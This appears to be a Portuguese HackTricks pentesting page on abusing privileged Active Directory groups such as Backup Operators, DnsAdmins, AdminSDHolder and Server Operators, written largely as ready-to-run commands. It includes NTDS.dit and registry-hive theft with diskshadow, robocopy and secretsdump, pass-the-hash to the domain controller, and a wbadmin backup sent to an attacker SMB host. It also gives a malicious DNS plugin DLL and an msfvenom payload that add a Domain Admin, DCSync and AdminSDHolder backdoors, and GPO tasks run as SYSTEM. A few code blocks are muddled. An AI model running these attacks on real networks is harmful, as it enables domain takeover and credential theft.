# Grupos Privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos bem conhecidos com privilégios de administração

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tem permissão para criar contas e grupos que não são administradores no domínio. Além disso, ele permite login local no Controlador de Domínio (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Adicionar novos usuários é permitido, assim como o login local no DC.

## Grupo AdminSDHolder

A Lista de Controle de Acesso (ACL) do **AdminSDHolder** é crucial, pois define permissões para todos os grupos "protegidos" dentro do Active Directory, incluindo grupos de alto privilégio. Esse mecanismo garante a segurança desses grupos ao prevenir modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do **AdminSDHolder**, concedendo permissões totais a um usuário comum. Isso daria efetivamente a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário forem alteradas ou removidas, elas seriam automaticamente restabelecidas em até uma hora devido ao funcionamento do sistema.

A documentação recente do Windows Server ainda trata vários grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). O processo **SDProp** é executado no **PDC Emulator** a cada 60 minutos por padrão, define `adminCount=1` e desabilita a herança em objetos protegidos. Isso é útil tanto para persistência quanto para caçar usuários privilegiados remanescentes que foram removidos de um grupo protegido, mas ainda mantêm a ACL sem herança.

Comandos para revisar os membros e modificar permissões incluem:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Um script está disponível para agilizar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

A associação a este grupo permite a leitura de objetos do Active Directory excluídos, o que pode revelar informações sensíveis:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Isso é útil para **recuperar caminhos de privilégios anteriores**. Objetos excluídos ainda podem expor `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, old SPNs, ou o DN de um grupo privilegiado excluído que pode ser posteriormente restaurado por outro operador.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acesso ao Controlador de Domínio

O acesso a arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Escalada de Privilégios

Usando `PsService` ou `sc` do Sysinternals, pode-se inspecionar e modificar permissões de serviços. O grupo `Server Operators`, por exemplo, tem controle total sobre certos serviços, permitindo a execução de comandos arbitrários e escalada de privilégios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` têm acesso total, permitindo a manipulação de serviços para obter privilégios elevados.

## Backup Operators

A pertença ao grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem percorrer pastas, listar e copiar arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para esse processo.

Para listar os membros do grupo, execute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para utilizar esses privilégios localmente, os seguintes passos são empregados:

1. Importe as bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilitar e verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acessar e copiar arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque AD

O acesso direto ao sistema de arquivos do Controlador de Domínio permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM dos usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Crie uma cópia sombra do disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` da cópia de sombra:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrair `SYSTEM` e `SAM` para recuperar hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos os hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Pós-extração: Pass-the-Hash para DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Usando wbadmin.exe

1. Configure o filesystem NTFS para o servidor SMB na máquina do atacante e faça cache das credenciais SMB na máquina alvo.
2. Use `wbadmin.exe` para backup do sistema e extração de `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para uma demonstração prática, veja [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios SYSTEM em um servidor DNS, frequentemente hospedado em Controladores de Domínio. Essa capacidade permite um potencial de exploração significativo.

Para listar os membros do grupo DnsAdmins, use:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidade permite a execução de código arbitrário com privilégios SYSTEM no serviço DNS (geralmente dentro dos DCs). Esse problema foi corrigido em 2021.

Membros podem fazer o servidor DNS carregar uma DLL arbitrária (localmente ou a partir de um compartilhamento remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para mais detalhes sobre este vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é viável usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Registro WPAD para MitM

DnsAdmins pode manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desabilitar a lista global de bloqueio de consultas. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.

### Leitores de logs de eventos
Membros podem acessar os logs de eventos, potencialmente encontrando informações sensíveis, como senhas em texto simples ou detalhes de execução de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo pode modificar DACLs no objeto de domínio, potencialmente concedendo privilégios DCSync. Técnicas para escalada de privilégios explorando este grupo são detalhadas no Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Se você puder agir como membro desse grupo, o abuso clássico é conceder a um principal controlado por um atacante os direitos de replicação necessários para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historicamente, **PrivExchange** encadeava o acesso a caixas de correio, forçava a autenticação do Exchange e realizava LDAP relay para chegar a essa mesma primitiva. Mesmo quando esse caminho de relay é mitigado, a pertença direta a `Exchange Windows Permissions` ou o controle de um servidor Exchange permanece uma via de alto valor para direitos de replicação de domínio.

## Administradores do Hyper-V

Administradores do Hyper-V têm acesso total ao Hyper-V, que pode ser explorado para obter controle sobre Controladores de Domínio virtualizados. Isso inclui clonar DCs ativos e extrair hashes NTLM do arquivo NTDS.dit.

### Exemplo de Exploração

O abuso prático costuma ser **acesso offline a discos/checkpoints de DCs** em vez das velhas técnicas de LPE a nível do host. Com acesso ao host Hyper-V, um operador pode criar um checkpoint ou exportar um Controlador de Domínio virtualizado, montar o VHDX e extrair `NTDS.dit`, `SYSTEM` e outros segredos sem tocar no LSASS dentro do sistema convidado:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
A partir daí, reutilize o fluxo de trabalho do `Backup Operators` para copiar `Windows\NTDS\ntds.dit` e os hives do registro offline.

## Group Policy Creators Owners

Este grupo permite que membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar group policies a usuários ou grupos nem editar GPOs existentes.

A nuance importante é que o **criador se torna proprietário do novo GPO** e normalmente obtém direitos suficientes para editá‑lo depois. Isso significa que este grupo é interessante quando você pode:

- criar um GPO malicioso e convencer um administrador a vinculá‑lo a uma OU/domínio alvo
- editar um GPO que você criou e que já esteja vinculado em algum lugar útil
- abusar de outro direito delegado que permite vincular GPOs, enquanto este grupo lhe dá o lado de edição

Na prática, o abuso normalmente envolve adicionar uma **Immediate Task**, **startup script**, **local admin membership** ou uma alteração em **user rights assignment** por meio de arquivos de política suportados pelo SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Se editar a GPO manualmente através de `SYSVOL`, lembre-se que a alteração não é suficiente por si só: `versionNumber`, `GPT.ini` e, às vezes, `gPCMachineExtensionNames` também devem ser atualizados ou os clientes ignorarão a atualização da política.

## Organization Management

Em ambientes onde **Microsoft Exchange** está implantado, um grupo especial conhecido como **Organization Management** possui capacidades significativas. Este grupo tem privilégio para **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre a Unidade Organizacional (OU) 'Microsoft Exchange Security Groups'**. Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para escalada de privilégios.

### Privilege Exploitation and Commands

#### Print Operators

Membros do grupo **Print Operators** possuem vários privilégios, incluindo **`SeLoadDriverPrivilege`**, que lhes permite **fazer logon localmente em um Domain Controller**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se **`SeLoadDriverPrivilege`** não for visível em um contexto não elevado, é necessário contornar o User Account Control (UAC).

Para listar os membros deste grupo, o seguinte comando PowerShell é usado:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Nos Controladores de Domínio, este grupo é perigoso porque a Política de Controlador de Domínio padrão concede **`SeLoadDriverPrivilege`** a `Print Operators`. Se você obtiver um token elevado de um membro deste grupo, pode habilitar o privilégio e carregar um driver assinado, porém vulnerável, para subir ao kernel/SYSTEM. Para detalhes sobre o manuseio de tokens, confira [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Usuários de Área de Trabalho Remota

Os membros deste grupo têm acesso a PCs via Remote Desktop Protocol (RDP). Para enumerar esses membros, existem comandos PowerShell disponíveis:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre a exploração do RDP podem ser encontradas em recursos dedicados de pentesting.

#### Usuários de Gerenciamento Remoto

Membros podem acessar computadores via **Windows Remote Management (WinRM)**. A enumeração desses membros é feita através de:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, deve-se consultar a documentação específica.

#### Operadores de Servidor

Este grupo tem permissões para executar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração do horário do sistema e desligamento do sistema. Para enumerar os membros, o comando fornecido é:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Em Domain Controllers, `Server Operators` frequentemente herdam direitos suficientes para **reconfigurar ou iniciar/parar serviços** e também recebem `SeBackupPrivilege`/`SeRestorePrivilege` pela política DC padrão. Na prática, isso os torna uma ponte entre **service-control abuse** e **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Se a ACL do serviço conceder a este grupo direitos de alterar/iniciar, aponte o serviço para um comando arbitrário, inicie-o como `LocalSystem` e então restaure o `binPath` original. Se o controle de serviços estiver bloqueado, recorra às técnicas de `Backup Operators` acima para copiar o `NTDS.dit`.

## Referências <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
